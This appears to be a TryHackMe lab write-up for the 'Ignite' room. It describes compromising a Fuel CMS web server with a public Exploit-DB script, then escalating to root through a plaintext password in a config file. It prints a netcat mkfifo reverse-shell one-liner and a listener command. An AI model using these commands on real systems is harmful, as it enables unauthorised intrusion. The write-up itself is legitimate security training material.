---
title: "Ignite - TryHackMe"
date: 2026-03-28 01:17:00 +0000
categories: [TryHackMe, Writeups]
tags: [nmap, rce, reverse-shell, privilege-escalation]
image: /assets/img/writeups/covers/ignite.png
---
# Ignite - TryHackMe
![1.png](/assets/img/writeups/ignite/1.png)
**Difficulty**: Easy <br>**Time Required** : 40 min
## Reconnaissance
Started with an Nmap scan to identify open ports and services: `nmap -p- 10.66.190.237 -sV -T4`
````
$ nmap -p- 10.66.190.237 -sV -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 06:55 +0500
Nmap scan report for 10.66.190.237 (10.66.190.237)
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.31 seconds

````

### Findings
- Port 80 → HTTP (Web Server)

Visiting the web server:
````
http://10.66.190.237
````
![1.png](/assets/img/writeups/ignite/2.png)
## RCE
The version of Fuel CMS appears to be outdated or vulnerable, so let’s visit [Exploit Database](https://www.exploit-db.com/) and search for this version to find a suitable exploit.
![1.png](/assets/img/writeups/ignite/3.png)
We found an exploit that matches our version and is compatible, so let’s download it and configure it.
![1.png](/assets/img/writeups/ignite/4.png)
Change the IP and port, and remove the proxy on line 25.<br>**Run this exploit**:
````
$ python2 47138.py
````
![1.png](/assets/img/writeups/ignite/5.png)
## Reverse Shell
Once Remote Code Execution (RCE) is achieved, the immediate priority is upgrading to a reverse shell to establish a more stable, interactive environment for efficient file navigation and rapid post-exploitation.
![1.png](/assets/img/writeups/ignite/6.png)
After testing various payloads from RevShells, `nc mkfifo` named pipe reverse shell successfully established the connection: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.219.152 1234 >/tmp/f`
**Setup a listener**:
````
$ nc -u -lvnp 1234
listening on [any] 1234 ...
````
![1.png](/assets/img/writeups/ignite/7.png)
![1.png](/assets/img/writeups/ignite/8.png)
To upgrade to a fully interactive TTY, I used a Python one-liner to spawn a Bash shell:
````
python3 -c 'import pty; pty.spawn("/bin/bash")'
````
Catch the `user.txt` Flag
![1.png](/assets/img/writeups/ignite/9.png)
## Privilege escalation
No SUID binaries were found, and there were no commands available to run with sudo. Upon reviewing `/robots.txt`, it was observed that access to the `/fuel` directory is disallowed, indicating the presence of sensitive data.
![1.png](/assets/img/writeups/ignite/10.png)
Navigating to `/fuel`, the directory contains numerous subfolders and files, so the focus was directed toward `/application/config`, which stores configuration data. After examining the files, `database.php` was identified as containing the root password in plaintext.
![1.png](/assets/img/writeups/ignite/11.png)
![1.png](/assets/img/writeups/ignite/12.png)
With the password obtained, switching to the root user is possible now using `su root`. Finally, the `root.txt` flag can be accessed which is stored inside `/root` directory.
![1.png](/assets/img/writeups/ignite/13.png)
